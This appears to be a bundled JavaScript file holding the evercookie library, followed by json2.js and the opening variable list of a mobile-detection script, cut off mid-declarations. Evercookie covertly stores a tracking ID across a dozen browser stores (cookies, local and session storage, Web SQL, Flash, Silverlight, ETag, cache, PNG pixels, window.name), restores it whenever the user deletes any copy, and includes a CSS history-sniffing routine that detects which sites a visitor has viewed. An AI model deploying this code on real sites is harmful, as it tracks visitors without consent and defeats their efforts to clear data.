

/* to turn off CSS history knocking, set _ec_history to 0 */
var _ec_history = 1; // CSS history knocking or not .. can be network intensive
var _ec_tests = 10;//1000;
var _ec_debug = 0;

function _ec_dump(arr, level)
{
	var dumped_text = "";
	if(!level) level = 0;
	
	//The padding given at the beginning of the line.
	var level_padding = "";
	for(var j=0;j<level+1;j++) level_padding += "    ";
	
	if(typeof(arr) == 'object') { //Array/Hashes/Objects 
		for(var item in arr) {
			var value = arr[item];
			
			if(typeof(value) == 'object') { //If it is an array,
				dumped_text += level_padding + "'" + item + "' ...\n";
				dumped_text += _ec_dump(value,level+1);
			} else {
				dumped_text += level_padding + "'" + item + "' => \"" + value + "\"\n";
			}
		}
	} else { //Stings/Chars/Numbers etc.
		dumped_text = "===>"+arr+"<===("+typeof(arr)+")";
	}
	return dumped_text;
}

function _ec_replace(str, key, value)
{
	if (str.indexOf('&' + key + '=') > -1 || str.indexOf(key + '=') == 0)
	{
		// find start
		var idx = str.indexOf('&' + key + '=');
		if (idx == -1)
			idx = str.indexOf(key + '=');

		// find end
		var end = str.indexOf('&', idx + 1);
		var newstr;
		if (end != -1)
			newstr = str.substr(0, idx) + str.substr(end + (idx ? 0 : 1)) + '&' + key + '=' + value;
		else
			newstr = str.substr(0, idx) + '&' + key + '=' + value;

		return newstr;
	}
	else
		return str + '&' + key + '=' + value;
}


// necessary for flash to communicate with js...
// please implement a better way
var _global_lso;
function _evercookie_flash_var(cookie)
{
	_global_lso = cookie;

	// remove the flash object now
	var swf = $('#myswf');
	if (swf && swf.parentNode)
		swf.parentNode.removeChild(swf);
}

var evercookie = (function () {
this._class = function() {

var self = this;
// private property
_baseKeyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
this._ec = {};
var no_color = -1;

this.get = function(name, cb, dont_reset)
{
	$(document).ready(function() {
		self._evercookie(name, cb, undefined, undefined, dont_reset);
	});
};

this.set = function(name, value)
{
	$(document).ready(function() {
			self._evercookie(name, function() { }, value);
	});
};

this._evercookie = function(name, cb, value, i, dont_reset)
{
	if (typeof self._evercookie == 'undefined')
		self = this;
	
	if (typeof i == 'undefined')
		i = 0;

	// first run
	if (i == 0)
	{
		self.evercookie_database_storage(name, value);
		self.evercookie_png(name, value);
		self.evercookie_etag(name, value);
		self.evercookie_cache(name, value);
		self.evercookie_lso(name, value);
		self.evercookie_silverlight(name, value);

		self._ec.userData		= self.evercookie_userdata(name, value);
		self._ec.cookieData		= self.evercookie_cookie(name, value);
		self._ec.localData		= self.evercookie_local_storage(name, value);
		self._ec.globalData		= self.evercookie_global_storage(name, value);
		self._ec.sessionData	= self.evercookie_session_storage(name, value);
		self._ec.windowData		= self.evercookie_window(name, value);
	
		if (_ec_history)
			self._ec.historyData = self.evercookie_history(name, value);
	}

	// when writing data, we need to make sure lso and silverlight object is there
	if (typeof value != 'undefined')
	{
		if (
            (
                (typeof _global_lso == 'undefined') ||
                (typeof _global_isolated == 'undefined')
            )
            && i++ < _ec_tests
        )
			setTimeout(function() { self._evercookie(name, cb, value, i, dont_reset) }, 300);
	}
	
	// when reading data, we need to wait for swf, db, silverlight and png
	else
	{
		if (
			(
				// we support local db and haven't read data in yet
				(window.openDatabase && typeof self._ec.dbData == 'undefined') ||
				(typeof _global_lso == 'undefined') ||
				(typeof self._ec.etagData == 'undefined') ||
				(typeof self._ec.cacheData == 'undefined') ||
				(document.createElement('canvas').getContext && (typeof self._ec.pngData == 'undefined' || self._ec.pngData == '')) ||
                (typeof _global_isolated == 'undefined')
			)
			&&
			i++ < _ec_tests
		)
		{
			setTimeout(function() { self._evercookie(name, cb, value, i, dont_reset) }, 300);
		}

		// we hit our max wait time or got all our data
		else
		{
			// get just the piece of data we need from swf
			self._ec.lsoData = self.getFromStr(name, _global_lso);
			_global_lso = undefined;
            
			// get just the piece of data we need from silverlight
			self._ec.slData = self.getFromStr(name, _global_isolated);
			_global_isolated = undefined;

			var tmpec = self._ec;
			self._ec = {};
			
			// figure out which is the best candidate
			var candidates = new Array();
			var bestnum = 0;
			var candidate;
			for (var item in tmpec)
			{
				if (typeof tmpec[item] != 'undefined' && typeof tmpec[item] != 'null' && tmpec[item] != '' &&
				  tmpec[item] != 'null' && tmpec[item] != 'undefined' && tmpec[item] != null)
				{
						candidates[tmpec[item]] = typeof candidates[tmpec[item]] == 'undefined' ? 1 : candidates[tmpec[item]] + 1;
				}
			}
			
			for (var item in candidates)
			{
				if (candidates[item] > bestnum)
				{
					bestnum = candidates[item];
					candidate = item;
				}
			}
			
			// reset cookie everywhere
			if (typeof dont_reset == "undefined" || dont_reset != 1)
				self.set(name, candidate);

			if (typeof cb == 'function')
				cb(candidate, tmpec);
		}
	}
};

this.evercookie_window = function(name, value)
{
	try {
		if (typeof(value) != "undefined")
			window.name = _ec_replace(window.name, name, value);
		else
			return this.getFromStr(name, window.name);
	} catch(e) { }
};

this.evercookie_userdata = function(name, value)
{
	try {
		var elm = this.createElem('div', 'userdata_el', 1);
		elm.style.behavior = "url(#default#userData)";

		if (typeof(value) != "undefined")
		{
			elm.setAttribute(name, value);
			elm.save(name);
		}
		else
		{
			elm.load(name);
			return elm.getAttribute(name);
		}
	} catch(e) { }
};

this.evercookie_cache = function(name, value)
{
	if (typeof(value) != "undefined")
	{
		// make sure we have evercookie session defined first
		document.cookie = 'evercookie_cache=' + value;
		
		// evercookie_cache.php handles caching
		var img = new Image();
		img.style.visibility = 'hidden';
		img.style.position = 'absolute';
		img.src = 'evercookie_cache.php?name=' + name;
	}
	else
	{
		// interestingly enough, we want to erase our evercookie
		// http cookie so the php will force a cached response
		var origvalue = this.getFromStr('evercookie_cache', document.cookie);
		self._ec.cacheData = undefined;
		document.cookie = 'evercookie_cache=; expires=Mon, 20 Sep 2010 00:00:00 UTC; path=/';

		$.ajax({
			url: 'evercookie_cache.php?name=' + name,
			success: function(data) {
				// put our cookie back
				document.cookie = 'evercookie_cache=' + origvalue + '; expires=Tue, 31 Dec 2030 00:00:00 UTC; path=/';

				self._ec.cacheData = data;
			}
		});
	}
};

this.evercookie_etag = function(name, value)
{
	if (typeof(value) != "undefined")
	{
		// make sure we have evercookie session defined first
		document.cookie = 'evercookie_etag=' + value;
		
		// evercookie_etag.php handles etagging
		var img = new Image();
		img.style.visibility = 'hidden';
		img.style.position = 'absolute';
		img.src = 'evercookie_etag.php?name=' + name;
	}
	else
	{
		// interestingly enough, we want to erase our evercookie
		// http cookie so the php will force a cached response
		var origvalue = this.getFromStr('evercookie_etag', document.cookie);
		self._ec.etagData = undefined;
		document.cookie = 'evercookie_etag=; expires=Mon, 20 Sep 2010 00:00:00 UTC; path=/';

		$.ajax({
			url: 'evercookie_etag.php?name=' + name,
			success: function(data) {
				// put our cookie back
				document.cookie = 'evercookie_etag=' + origvalue + '; expires=Tue, 31 Dec 2030 00:00:00 UTC; path=/';

				self._ec.etagData = data;
			}
		});
	}
};

this.evercookie_lso = function(name, value)
{
    var div = document.getElementById('swfcontainer');
	if (!div)
	{
		div = document.createElement("div");
		div.setAttribute('id', 'swfcontainer');
		document.body.appendChild(div);
	}

	var flashvars = {};
	if (typeof value != 'undefined')
		flashvars.everdata = name + '=' + value;

	var params           = {};
	params.swliveconnect = "true";
	var attributes       = {};
	attributes.id        = "myswf";
	attributes.name      = "myswf";
	swfobject.embedSWF("evercookie.swf", "swfcontainer", "1", "1", "9.0.0", false, flashvars, params, attributes);
};

this.evercookie_png = function(name, value)
{
	if (document.createElement('canvas').getContext)
	{
		if (typeof(value) != "undefined")
		{
			// make sure we have evercookie session defined first
			document.cookie = 'evercookie_png=' + value;
			
			// evercookie_png.php handles the hard part of generating the image
			// based off of the http cookie and returning it cached
			var img = new Image();
			img.style.visibility = 'hidden';
			img.style.position = 'absolute';
			img.src = 'evercookie_png.php?name=' + name;
		}
		else
		{
			self._ec.pngData = undefined;
			var context = document.createElement('canvas');
			context.style.visibility = 'hidden';
			context.style.position = 'absolute';
			context.width = 200;
			context.height = 1;
			var ctx = context.getContext('2d');
			
			// interestingly enough, we want to erase our evercookie
			// http cookie so the php will force a cached response
			var origvalue = this.getFromStr('evercookie_png', document.cookie);
			document.cookie = 'evercookie_png=; expires=Mon, 20 Sep 2010 00:00:00 UTC; path=/';

			var img = new Image();
			img.style.visibility = 'hidden';
			img.style.position = 'absolute';
			img.src = 'evercookie_png.php?name=' + name;
			
			img.onload = function()
			{
				// put our cookie back
				document.cookie = 'evercookie_png=' + origvalue + '; expires=Tue, 31 Dec 2030 00:00:00 UTC; path=/';

				self._ec.pngData = '';
				ctx.drawImage(img,0,0);

				// get CanvasPixelArray from  given coordinates and dimensions
				var imgd = ctx.getImageData(0, 0, 200, 1);
				var pix = imgd.data;

				// loop over each pixel to get the "RGB" values (ignore alpha)
				for (var i = 0, n = pix.length; i < n; i += 4)
				{
					if (pix[i  ] == 0) break;
					self._ec.pngData += String.fromCharCode(pix[i]);
					if (pix[i+1] == 0) break;
					self._ec.pngData += String.fromCharCode(pix[i+1]);
					if (pix[i+2] == 0) break;
					self._ec.pngData += String.fromCharCode(pix[i+2]);
				}
			}	
		}
	}
};

this.evercookie_local_storage = function(name, value)
{
	try
	{
		if (window.localStorage)
		{
			if (typeof(value) != "undefined")
				localStorage.setItem(name, value);
			else
				return localStorage.getItem(name);
		}
	}
	catch (e) { }
};

this.evercookie_database_storage = function(name, value)
{
	try
	{
		if (window.openDatabase)
		{		
			var database = window.openDatabase("sqlite_evercookie", "", "evercookie", 1024 * 1024);

			if (typeof(value) != "undefined")
				database.transaction(function(tx)
				{
					tx.executeSql("CREATE TABLE IF NOT EXISTS cache(" +
						"id INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT, " +
						"name TEXT NOT NULL, " +
						"value TEXT NOT NULL, " +
						"UNIQUE (name)" + 
					")", [], function (tx, rs) { }, function (tx, err) { });

					tx.executeSql("INSERT OR REPLACE INTO cache(name, value) VALUES(?, ?)", [name, value],
						function (tx, rs) { }, function (tx, err) { })
				});
			else
			{
				database.transaction(function(tx)
				{
					tx.executeSql("SELECT value FROM cache WHERE name=?", [name],
					function(tx, result1) {
						if (result1.rows.length >= 1)
							self._ec.dbData = result1.rows.item(0)['value'];
						else
							self._ec.dbData = '';
					}, function (tx, err) { })
				});
			}
		}
	} catch(e) { }
};

this.evercookie_session_storage = function(name, value)
{
	try
	{
		if (window.sessionStorage)
		{
			if (typeof(value) != "undefined")
				sessionStorage.setItem(name, value);
			else
				return sessionStorage.getItem(name);
		}
	} catch(e) { }
};

this.evercookie_global_storage = function(name, value)
{
	if (window.globalStorage)
	{
		var host = this.getHost();

		try
		{
			if (typeof(value) != "undefined")
				eval("globalStorage[host]." + name + " = value");
			else
				return eval("globalStorage[host]." + name);
		} catch(e) { }
	}
};
this.evercookie_silverlight = function(name, value) {
    /*
     * Create silverlight embed
     * 
     * Ok. so, I tried doing this the proper dom way, but IE chokes on appending anything in object tags (including params), so this
     * is the best method I found. Someone really needs to find a less hack-ish way. I hate the look of this shit.
    */
        var source = "evercookie.xap";
        var minver = "4.0.50401.0";
        
        var initParam = "";
        if(typeof(value) != "undefined")
            initParam = '<param name="initParams" value="'+name+'='+value+'" />';
        
        var html =
        '<object data="data:application/x-silverlight-2," type="application/x-silverlight-2" id="mysilverlight" width="0" height="0">' +
            initParam +
            '<param name="source" value="'+source+'"/>' +
            '<param name="onLoad" value="onSilverlightLoad"/>' +
            '<param name="onError" value="onSilverlightError"/>' +
            '<param name="background" value="Transparent"/>' +
            '<param name="windowless" value="true"/>' +
            '<param name="minRuntimeVersion" value="'+minver+'"/>' +
            '<param name="autoUpgrade" value="true"/>' +
            '<a href="http://go.microsoft.com/fwlink/?LinkID=149156&v='+minver+'" style="text-decoration:none">' +
              '<img src="http://go.microsoft.com/fwlink/?LinkId=108181" alt="Get Microsoft Silverlight" style="border-style:none"/>' +
            '</a>' +
        '</object>';
        document.body.innerHTML+=html;
};

// public method for encoding
this.encode = function (input) {
	var output = "";
	var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
	var i = 0;

	input = this._utf8_encode(input);

	while (i < input.length) {

		chr1 = input.charCodeAt(i++);
		chr2 = input.charCodeAt(i++);
		chr3 = input.charCodeAt(i++);

		enc1 = chr1 >> 2;
		enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
		enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
		enc4 = chr3 & 63;

		if (isNaN(chr2)) {
			enc3 = enc4 = 64;
		} else if (isNaN(chr3)) {
			enc4 = 64;
		}

		output = output +
		_baseKeyStr.charAt(enc1) + _baseKeyStr.charAt(enc2) +
		_baseKeyStr.charAt(enc3) + _baseKeyStr.charAt(enc4);

	}

	return output;
};

// public method for decoding
this.decode = function (input) {
	var output = "";
	var chr1, chr2, chr3;
	var enc1, enc2, enc3, enc4;
	var i = 0;

	input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");

	while (i < input.length) {
		enc1 = _baseKeyStr.indexOf(input.charAt(i++));
		enc2 = _baseKeyStr.indexOf(input.charAt(i++));
		enc3 = _baseKeyStr.indexOf(input.charAt(i++));
		enc4 = _baseKeyStr.indexOf(input.charAt(i++));

		chr1 = (enc1 << 2) | (enc2 >> 4);
		chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
		chr3 = ((enc3 & 3) << 6) | enc4;

		output = output + String.fromCharCode(chr1);

		if (enc3 != 64) {
			output = output + String.fromCharCode(chr2);
		}
		if (enc4 != 64) {
			output = output + String.fromCharCode(chr3);
		}

	}

	output = this._utf8_decode(output);

	return output;

};

// private method for UTF-8 encoding
this._utf8_encode = function (string) {
	string = string.replace(/\r\n/g,"\n");
	var utftext = "";

	for (var n = 0; n < string.length; n++) {

		var c = string.charCodeAt(n);

		if (c < 128) {
			utftext += String.fromCharCode(c);
		}
		else if((c > 127) && (c < 2048)) {
			utftext += String.fromCharCode((c >> 6) | 192);
			utftext += String.fromCharCode((c & 63) | 128);
		}
		else {
			utftext += String.fromCharCode((c >> 12) | 224);
			utftext += String.fromCharCode(((c >> 6) & 63) | 128);
			utftext += String.fromCharCode((c & 63) | 128);
		}

	}

	return utftext;
};

// private method for UTF-8 decoding
this._utf8_decode = function (utftext) {
	var string = "";
	var i = 0;
	var c = c1 = c2 = 0;

	while ( i < utftext.length ) {

		c = utftext.charCodeAt(i);

		if (c < 128) {
			string += String.fromCharCode(c);
			i++;
		}
		else if((c > 191) && (c < 224)) {
			c2 = utftext.charCodeAt(i+1);
			string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
			i += 2;
		}
		else {
			c2 = utftext.charCodeAt(i+1);
			c3 = utftext.charCodeAt(i+2);
			string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
			i += 3;
		}

	}

	return string;
};

// this is crazy but it's 4am in dublin and i thought this would be hilarious
// blame the guinness
this.evercookie_history = function(name, value)
{
	// - is special
	var baseStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=-";
	var baseElems = baseStr.split("");
	
	// sorry google.
	var url = 'http://www.google.com/evercookie/cache/' + this.getHost() + '/' + name;

	if (typeof(value) != "undefined")
	{
		// don't reset this if we already have it set once
		// too much data and you can't clear previous values
		if (this.hasVisited(url))
			return;

		this.createIframe(url, 'if');
		url = url + '/';

		var base = this.encode(value).split("");
		for (var i = 0; i < base.length; i++)
		{
			url = url + base[i];
			this.createIframe(url, 'if' + i);
		}

		// - signifies the end of our data
		url = url + '-';
		this.createIframe(url, 'if_');
	}
	else
	{
		// omg you got csspwn3d
		if (this.hasVisited(url))
		{
			url = url + '/';

			var letter = "";
			var val = "";
			var found = 1;
			while (letter != '-' && found == 1)
			{
				found = 0;
				for (var i = 0; i < baseElems.length; i++)
				{
					if (this.hasVisited(url + baseElems[i]))
					{
						letter = baseElems[i];
						if (letter != '-')
							val = val + letter;
						url = url + letter;
						found = 1;
						break;
					}
				}
			}
			
			// lolz
			return this.decode(val);
		}
	}
};

this.createElem = function(type, name, append)
{
	var el;
	if (typeof name != 'undefined' && document.getElementById(name))
		el = document.getElementById(name);
	else
		el = document.createElement(type);
	el.style.visibility = 'hidden';
	el.style.position = 'absolute';

	if (name)
		el.setAttribute('id', name);

	if (append)
		document.body.appendChild(el);

	return el;
};

this.createIframe = function(url, name)
{
	var el = this.createElem('iframe', name, 1);
	el.setAttribute('src', url);
	return el;
};

// wait for our swfobject to appear (swfobject.js to load)
this.waitForSwf = function(i)
{
	if (typeof i == 'undefined')
		i = 0;
	else
		i++;

	// wait for ~2 seconds for swfobject to appear
	if (i < _ec_tests && typeof swfobject == 'undefined')
		setTimeout(function() { waitForSwf(i) }, 300);
};

this.evercookie_cookie = function(name, value)
{
    try{
        if (typeof(value) != "undefined")
        {
            // expire the cookie first
            document.cookie = name + '=; expires=Mon, 20 Sep 2010 00:00:00 UTC; path=/';
            document.cookie = name + '=' + value + '; expires=Tue, 31 Dec 2030 00:00:00 UTC; path=/';
        }
        else
            return this.getFromStr(name, document.cookie);
    }catch(e){
        // the hooked domain is using HttpOnly, so we must set the hook ID in a different way.
        // evercookie_userdata and evercookie_window will be used in this case.
    }
};

// get value from param-like string (eg, "x=y&name=VALUE")
this.getFromStr = function(name, text)
{
	if (typeof text != 'string')
		return;
		
	var nameEQ = name + "=";
	var ca = text.split(/[;&]/);
	for (var i = 0; i < ca.length; i++)
	{
		var c = ca[i];
		while (c.charAt(0) == ' ')
			c = c.substring(1, c.length);
		if (c.indexOf(nameEQ) == 0)
			return c.substring(nameEQ.length, c.length);
	}
};

this.getHost = function()
{
	var domain = document.location.host;
	if (domain.indexOf('www.') == 0)
		domain = domain.replace('www.', '');
	return domain;
};

this.toHex = function(str)
{
    var r = "";
    var e = str.length;
    var c = 0;
    var h;
    while (c < e)
    {
        h = str.charCodeAt(c++).toString(16);
        while (h.length < 2)
        	h = "0" + h;
        r += h;
    }
    return r;
};

this.fromHex = function(str)
{
    var r = "";
    var e = str.length;
    var s;
    while (e >= 0)
    {
        s = e - 2;
        r = String.fromCharCode("0x" + str.substring(s, e)) + r;
        e = s;
    }
    return r;
};

/* 
 * css history knocker (determine what sites your visitors have been to)
 *
 * originally by Jeremiah Grossman
 * http://jeremiahgrossman.blogspot.com/2006/08/i-know-where-youve-been.html
 *
 * ported to additional browsers by Samy Kamkar
 *
 * compatible with ie6, ie7, ie8, ff1.5, ff2, ff3, opera, safari, chrome, flock
 *
 * - code@samy.pl
 */


this.hasVisited = function(url)
{
	if (this.no_color == -1)
	{
		var no_style = this._getRGB("http://samy-was-here-this-should-never-be-visited.com", -1);
		if (no_style == -1)
			this.no_color =
				this._getRGB("http://samy-was-here-"+Math.floor(Math.random()*9999999)+"rand.com");
	}
	
	// did we give full url?
	if (url.indexOf('https:') == 0 || url.indexOf('http:') == 0)
		return this._testURL(url, this.no_color);
		
	// if not, just test a few diff types	if (exact)
	return	this._testURL("http://" + url, this.no_color) ||
		this._testURL("https://" + url, this.no_color) ||
		this._testURL("http://www." + url, this.no_color) ||
		this._testURL("https://www." + url, this.no_color);
};

/* create our anchor tag */
var _link = this.createElem('a', '_ec_rgb_link');

/* for monitoring */
var created_style;

/* create a custom style tag for the specific link. Set the CSS visited selector to a known value */
var _cssText = '#_ec_rgb_link:visited{display:none;color:#FF0000}';

/* Methods for IE6, IE7, FF, Opera, and Safari */
try {
	created_style = 1;
	var style = document.createElement('style');
	if (style.styleSheet)
		style.styleSheet.innerHTML = _cssText;
	else if (style.innerHTML)
		style.innerHTML = _cssText;
	else
	{
		var cssT = document.createTextNode(_cssText);
		style.appendChild(cssT);
	}
} catch (e) {
	created_style = 0;
}

/* if test_color, return -1 if we can't set a style */
this._getRGB = function (u, test_color) {
    if (test_color && created_style == 0)
        return -1;

    /* create the new anchor tag with the appropriate URL information */
    _link.href = u;
    _link.innerHTML = u;
    // not sure why, but the next two appendChilds always have to happen vs just once
    document.body.appendChild(style);
    document.body.appendChild(_link);

    /* add the link to the DOM and save the visible computed color */
    var color;
    if (document.defaultView)
        color = document.defaultView.getComputedStyle(_link, null).getPropertyValue('color');
    else
        color = _link.currentStyle['color'];

    return color;
};

this._testURL = function(url, no_color){
	var color = this._getRGB(url);

	/* check to see if the link has been visited if the computed color is red */
	if (color == "rgb(255, 0, 0)" || color == "#ff0000")
		return 1;

	/* if our style trick didn't work, just compare default style colors */
	else if (no_color && color != no_color)
		return 1;

	/* not found */
	return 0;
}

};

return _class;
})();


/*
 * Again, ugly workaround....same problem as flash.
*/
var _global_isolated;
function onSilverlightLoad(sender, args) {
    var control = sender.getHost();
    _global_isolated = control.Content.App.getIsolatedStorage();
}
/*
function onSilverlightError(sender, args) {
    _global_isolated = "";
    
}*/
function onSilverlightError(sender, args) {
    _global_isolated = "";
}


/*
    https://github.com/douglascrockford/JSON-js/blob/master/json2.js
    2011-02-23

// Create a JSON object only if one does not already exist. We create the
// methods in a closure to avoid creating global variables.
*/

var JSON;
if (!JSON) {
    JSON = {};
}

(function () {
    "use strict";

    function f(n) {
        // Format integers to have at least two digits.
        return n < 10 ? '0' + n : n;
    }

    if (typeof Date.prototype.toJSON !== 'function') {

        Date.prototype.toJSON = function (key) {

            return isFinite(this.valueOf()) ?
                this.getUTCFullYear()     + '-' +
                f(this.getUTCMonth() + 1) + '-' +
                f(this.getUTCDate())      + 'T' +
                f(this.getUTCHours())     + ':' +
                f(this.getUTCMinutes())   + ':' +
                f(this.getUTCSeconds())   + 'Z' : null;
        };

        String.prototype.toJSON      =
            Number.prototype.toJSON  =
            Boolean.prototype.toJSON = function (key) {
                return this.valueOf();
            };
    }

    var cx = /[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,
        escapable = /[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,
        gap,
        indent,
        meta = {    // table of character substitutions
            '\b': '\\b',
            '\t': '\\t',
            '\n': '\\n',
            '\f': '\\f',
            '\r': '\\r',
            '"' : '\\"',
            '\\': '\\\\'
        },
        rep;


    function quote(string) {

// If the string contains no control characters, no quote characters, and no
// backslash characters, then we can safely slap some quotes around it.
// Otherwise we must also replace the offending characters with safe escape
// sequences.

        escapable.lastIndex = 0;
        return escapable.test(string) ? '"' + string.replace(escapable, function (a) {
            var c = meta[a];
            return typeof c === 'string' ? c :
                '\\u' + ('0000' + a.charCodeAt(0).toString(16)).slice(-4);
        }) + '"' : '"' + string + '"';
    }


    function str(key, holder) {

// Produce a string from holder[key].

        var i,          // The loop counter.
            k,          // The member key.
            v,          // The member value.
            length,
            mind = gap,
            partial,
            value = holder[key];

// If the value has a toJSON method, call it to obtain a replacement value.

        if (value && typeof value === 'object' &&
                typeof value.toJSON === 'function') {
            value = value.toJSON(key);
        }

// If we were called with a replacer function, then call the replacer to
// obtain a replacement value.

        if (typeof rep === 'function') {
            value = rep.call(holder, key, value);
        }

// What happens next depends on the value's type.

        switch (typeof value) {
        case 'string':
            return quote(value);

        case 'number':

// JSON numbers must be finite. Encode non-finite numbers as null.

            return isFinite(value) ? String(value) : 'null';

        case 'boolean':
        case 'null':

// If the value is a boolean or null, convert it to a string. Note:
// typeof null does not produce 'null'. The case is included here in
// the remote chance that this gets fixed someday.

            return String(value);

// If the type is 'object', we might be dealing with an object or an array or
// null.

        case 'object':

// Due to a specification blunder in ECMAScript, typeof null is 'object',
// so watch out for that case.

            if (!value) {
                return 'null';
            }

// Make an array to hold the partial results of stringifying this object value.

            gap += indent;
            partial = [];

// Is the value an array?

            if (Object.prototype.toString.apply(value) === '[object Array]') {

// The value is an array. Stringify every element. Use null as a placeholder
// for non-JSON values.

                length = value.length;
                for (i = 0; i < length; i += 1) {
                    partial[i] = str(i, value) || 'null';
                }

// Join all of the elements together, separated with commas, and wrap them in
// brackets.

                v = partial.length === 0 ? '[]' : gap ?
                    '[\n' + gap + partial.join(',\n' + gap) + '\n' + mind + ']' :
                    '[' + partial.join(',') + ']';
                gap = mind;
                return v;
            }

// If the replacer is an array, use it to select the members to be stringified.

            if (rep && typeof rep === 'object') {
                length = rep.length;
                for (i = 0; i < length; i += 1) {
                    if (typeof rep[i] === 'string') {
                        k = rep[i];
                        v = str(k, value);
                        if (v) {
                            partial.push(quote(k) + (gap ? ': ' : ':') + v);
                        }
                    }
                }
            } else {

// Otherwise, iterate through all of the keys in the object.

                for (k in value) {
                    if (Object.prototype.hasOwnProperty.call(value, k)) {
                        v = str(k, value);
                        if (v) {
                            partial.push(quote(k) + (gap ? ': ' : ':') + v);
                        }
                    }
                }
            }

// Join all of the member texts together, separated with commas,
// and wrap them in braces.

            v = partial.length === 0 ? '{}' : gap ?
                '{\n' + gap + partial.join(',\n' + gap) + '\n' + mind + '}' :
                '{' + partial.join(',') + '}';
            gap = mind;
            return v;
        }
    }

// If the JSON object does not yet have a stringify method, give it one.

    if (typeof JSON.stringify !== 'function') {
        JSON.stringify = function (value, replacer, space) {

// The stringify method takes a value and an optional replacer, and an optional
// space parameter, and returns a JSON text. The replacer can be a function
// that can replace values, or an array of strings that will select the keys.
// A default replacer method can be provided. Use of the space parameter can
// produce text that is more easily readable.

            var i;
            gap = '';
            indent = '';

// If the space parameter is a number, make an indent string containing that
// many spaces.

            if (typeof space === 'number') {
                for (i = 0; i < space; i += 1) {
                    indent += ' ';
                }

// If the space parameter is a string, it will be used as the indent string.

            } else if (typeof space === 'string') {
                indent = space;
            }

// If there is a replacer, it must be a function or an array.
// Otherwise, throw an error.

            rep = replacer;
            if (replacer && typeof replacer !== 'function' &&
                    (typeof replacer !== 'object' ||
                    typeof replacer.length !== 'number')) {
                throw new Error('JSON.stringify');
            }

// Make a fake root object containing our value under the key of ''.
// Return the result of stringifying the value.

            return str('', {'': value});
        };
    }


// If the JSON object does not yet have a parse method, give it one.

    if (typeof JSON.parse !== 'function') {
        JSON.parse = function (text, reviver) {

// The parse method takes a text and an optional reviver function, and returns
// a JavaScript value if the text is a valid JSON text.

            var j;

            function walk(holder, key) {

// The walk method is used to recursively walk the resulting structure so
// that modifications can be made.

                var k, v, value = holder[key];
                if (value && typeof value === 'object') {
                    for (k in value) {
                        if (Object.prototype.hasOwnProperty.call(value, k)) {
                            v = walk(value, k);
                            if (v !== undefined) {
                                value[k] = v;
                            } else {
                                delete value[k];
                            }
                        }
                    }
                }
                return reviver.call(holder, key, value);
            }


// Parsing happens in four stages. In the first stage, we replace certain
// Unicode characters with escape sequences. JavaScript handles many characters
// incorrectly, either silently deleting them, or treating them as line endings.

            text = String(text);
            cx.lastIndex = 0;
            if (cx.test(text)) {
                text = text.replace(cx, function (a) {
                    return '\\u' +
                        ('0000' + a.charCodeAt(0).toString(16)).slice(-4);
                });
            }

// In the second stage, we run the text against regular expressions that look
// for non-JSON patterns. We are especially concerned with '()' and 'new'
// because they can cause invocation, and '=' because it can cause mutation.
// But just to be safe, we want to reject all unexpected forms.

// We split the second stage into 4 regexp operations in order to work around
// crippling inefficiencies in IE's and Safari's regexp engines. First we
// replace the JSON backslash pairs with '@' (a non-JSON character). Second, we
// replace all simple value tokens with ']' characters. Third, we delete all
// open brackets that follow a colon or comma or that begin the text. Finally,
// we look to see that the remaining characters are only whitespace or ']' or
// ',' or ':' or '{' or '}'. If that is so, then the text is safe for eval.

            if (/^[\],:{}\s]*$/
                    .test(text.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g, '@')
                        .replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g, ']')
                        .replace(/(?:^|:|,)(?:\s*\[)+/g, ''))) {

// In the third stage we use the eval function to compile the text into a
// JavaScript structure. The '{' operator is subject to a syntactic ambiguity
// in JavaScript: it can begin a block or an object literal. We wrap the text
// in parens to eliminate the ambiguity.

                j = eval('(' + text + ')');

// In the optional fourth stage, we recursively walk the new structure, passing
// each name/value pair to a reviver function for possible transformation.

                return typeof reviver === 'function' ?
                    walk({'': j}, '') : j;
            }

// If the text is not JSON parseable, then a SyntaxError is thrown.

            throw new SyntaxError('JSON.parse');
        };
    }
}());



/* *******************************************
// Copyright 2010-2012, Anthony Hand
// mdetect : http://code.google.com/p/mobileesp/source/browse/JavaScript/mdetect.js r215
// LICENSE INFORMATION
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//        http://www.apache.org/licenses/LICENSE-2.0
// Unless required by applicable law or agreed to in writing,
// software distributed under the License is distributed on an
// "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND,
// either express or implied. See the License for the specific
// language governing permissions and limitations under the License.
// *******************************************
*/

var isIphone = false;
var isAndroidPhone = false;
var isTierTablet = false;
var isTierIphone = false;
var isTierRichCss = false;
var isTierGenericMobile = false;

var engineWebKit = "webkit";
var deviceIphone = "iphone";
var deviceIpod = "ipod";
var deviceIpad = "ipad";
var deviceMacPpc = "macintosh"; //Used for disambiguation

var deviceAndroid = "android";
var deviceGoogleTV = "googletv";
var deviceXoom = "xoom"; //Motorola Xoom
var deviceHtcFlyer = "htc_flyer"; //HTC Flyer

var deviceNuvifone = "nuvifone"; //Garmin Nuvifone

var deviceSymbian = "symbian";
var deviceS60 = "series60";
var deviceS70 = "series70";
var deviceS80 = "series80";
var deviceS90 = "series90";

var deviceWinPhone7 = "windows phone os 7";
var deviceWinMob = "windows ce";
var deviceWindows = "windows";
var deviceIeMob = "iemobile";
var devicePpc = "ppc"; //Stands for PocketPC
var enginePie = "wm5 pie";  //An old Windows Mobile

